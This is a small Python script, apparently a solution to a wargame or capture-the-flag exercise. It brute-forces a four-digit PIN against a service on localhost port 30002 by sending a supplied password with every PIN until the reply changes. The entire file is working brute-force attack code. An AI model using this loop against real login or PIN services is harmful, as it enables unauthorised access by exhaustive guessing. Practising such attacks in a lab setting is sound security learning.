import socket
import sys

if len(sys.argv) != 2:
    print(f"Usage : python {sys.argv[0]} <password>")
    exit()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("127.0.0.1", 30002))
    #data = s.recv(1024).decode().strip()
    #print(data)

    for pin in range(10000):

        spin = str(pin).rjust(4, '0')
        print(f"\rTrying {spin}", end='')
        
        s.send(sys.argv[1].encode() + b' ' + spin.encode() + b'\n')
        data = s.recv(1024).decode().strip()
        
        if "Wrong" not in data:
            print()
            print(f"Found it ! pin = {pin}")
            print(data)
            data = s.recv(1024).decode().strip()
            print(data)
            break

    s.close()
